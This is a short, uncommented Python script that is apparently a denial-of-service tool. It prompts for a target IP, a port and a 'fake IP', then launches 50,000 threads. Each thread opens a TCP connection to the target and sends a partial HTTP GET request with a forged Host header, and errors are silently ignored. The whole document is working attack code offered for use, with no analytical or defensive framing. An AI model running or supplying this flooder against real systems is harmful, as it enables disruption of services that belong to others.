import threading
import socket

target=input('Enter the Target IP: ')
port=int(input('Enter the Target Port: '))
fake_ip=input('Enter a Fake IP: ')

attack_connection = 0

def attack():
    global attack_connection
    try:
         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target,port))
         s.sendall(b"GET / HTTP/1.1\r\n")
         s.sendall(f"Host: {fake_ip}\r\n".encode('ascii'))
         s.close()

         attack_connection+=1
         if attack_connection%500==0:
                 print('Connection made: ', attack_connection)

    except:
        pass

for i in range(50000):
    thread=threading.Thread(target=attack)
    thread.start()

